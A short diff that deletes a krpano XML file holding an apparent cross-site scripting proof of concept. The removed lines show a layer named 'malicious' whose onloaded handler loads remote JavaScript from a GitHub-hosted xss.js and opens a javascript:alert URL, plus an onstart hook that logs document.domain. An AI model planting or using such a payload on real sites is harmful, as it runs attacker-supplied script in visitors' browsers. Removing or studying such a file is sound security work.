@@ -1,6 +1,0 @@
-<krpano onstart="js(console.log(document.domain));">
-    <layer name="malicious" 
-           type="container" 
-           visible="true" 
-           onloaded="loadjs('https:/raw.githubusercontent.com/schooldropout1337/nuclei-templates/refs/heads/main/xss.js');openurl(javascript:alert('1');, _parent);"/>
-</krpano>
